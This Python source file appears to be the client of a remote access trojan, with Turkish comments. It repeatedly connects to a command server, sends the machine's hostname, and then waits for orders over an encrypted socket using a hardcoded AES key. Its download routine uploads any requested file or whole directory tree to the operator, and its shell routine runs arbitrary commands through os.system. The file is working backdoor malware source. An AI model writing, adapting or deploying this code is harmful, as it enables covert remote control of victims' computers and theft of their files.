import os
import time
import ctypes
import socket
import subprocess
from core.utils.commons.networking import IpToFamily
from core.utils.commons.networking import JSONPacker
from core.utils.commons.networking import JSONUnpacker

from core.utils.commons.exceptions import ReadError
from core.utils.commons.exceptions import WriteError

from core.utils.parser import parse_header

from core.utils.commons.socket_utils import SockUtils
from core.utils.commons.io_utils import IOUtils,Modes

from core.utils.commons.commands import Commands,ErrorMessages

from core.utils.printing import *
key = "30e79f45d426cabf4aeaebb7192c77b5742abf2a1a993bc0a26ebb272bf9809e"
iv = '30e79f45d426cabf4aeaebb7192c77b5742abf2a1a993bc0a26ebb272bf9809e'
s = None


class Client:
    def __init__(self,host = None,port = None):
        self.server_credentials = {
            "host":host,
            "port":port
        }
        self.sock = socket.socket(IpToFamily(self.server_credentials["host"]),socket.SOCK_STREAM)
        try:
            self.hostname = socket.gethostname().encode()
        except:
            self.hostname = "NO_NAMED".encode()
        if self.connect():
            self.sock_handler = SockUtils(socket_descriptor=self.sock,aes_key=key,aes_iv=key,max_timeout=None)
            self.sock.send(self.hostname)
    def __enter__(self):
        return self
    def __exit__(self,*args):
        """
        Hiçbir şey yapmamız gerekmiyor çünkü çıkışta herhangi bir görev yok
        """
        pass # do anything 
    def connect(self) -> bool:
        for _ in range(1000):
            try:
                self.sock.connect((self.server_credentials["host"],self.server_credentials["port"]))
                return True
                break
            except:
                time.sleep(10) # 10 saniye bekleyip tekrar bağlanacak
                continue
        try:
            self.sock.send(self.hostname)
        except:
            pass
    def download(self,path):
        if not os.path.exists(path):
            self.sock_handler.send(header="file_credentials",commands={"file_path":"invalid_path"})
        else:
            if os.path.isfile(path):
                with IOUtils(path,mode=Modes.MODE_READ_AS_BINARY) as io_handler:
                    data = io_handler.read()
                    self.sock_handler.send("file_credentials",commands={"file_path":path,"file_data":data})
            elif os.path.isdir(path):
                for root,_,files in os.walk(path):
                    for f in files:
                        full_path = os.path.join(root,f)
                        with IOUtils(full_path,mode=Modes.MODE_READ_AS_BINARY) as io_handler:
                            data = io_handler.read()
                            self.sock_handler.send("file_credentials",commands={"file_path":full_path,"file_data":data})
                self.sock_handler.send("file_credentials",commands={"file_path":"EOP","file_data":""})
            else:
                self.sock_handler.send("file_credentials",commands={"file_path":"invalid_file_type","file_data":""})
    def shell(self,commands):
        try:
            executed_command_output = str(os.system(commands))
            self.sock_handler.send("shell_exec",commands={"command_output":executed_command_output})
        except Exception as exec_err:
            self.sock_handler.send(header=ErrorMessages.ERR_MSG_I_CANT_DO_SHELL_EXEC,commands={"exception":str(exec_err)})
    def msgbox(self,msg: str) -> str:
        try:
            ctypes.windll.user32.MessageBoxW(None,msg,title,64)
        except:
            pass
    def handle_commands(self):
        while True:
            raw_data = self.sock_handler.recv()
            pkt_header = parse_header(raw_data,index=0)
            data = raw_data[pkt_header]
            if pkt_header:
                if pkt_header == Commands.COMMAND_DO_DOWNLOAD:
                    file_path = data["path"]
                    self.download(file_path)
                elif pkt_header == Commands.COMMAND_DO_SHELL_EXEC:
                    command = data["commands"]
                    self.shell(commands=command)
                elif pkt_header == Commands.COMMAND_DO_GET_CLIENT_IS_ONLINE:
                    pass


    def start(self):
        self.handle_commands()
if __name__ == "__main__":
    try:
        with Client(host="127.0.0.1",port=4444) as client:
            client.start()
    except Exception as e:
        raise Exception("") from e
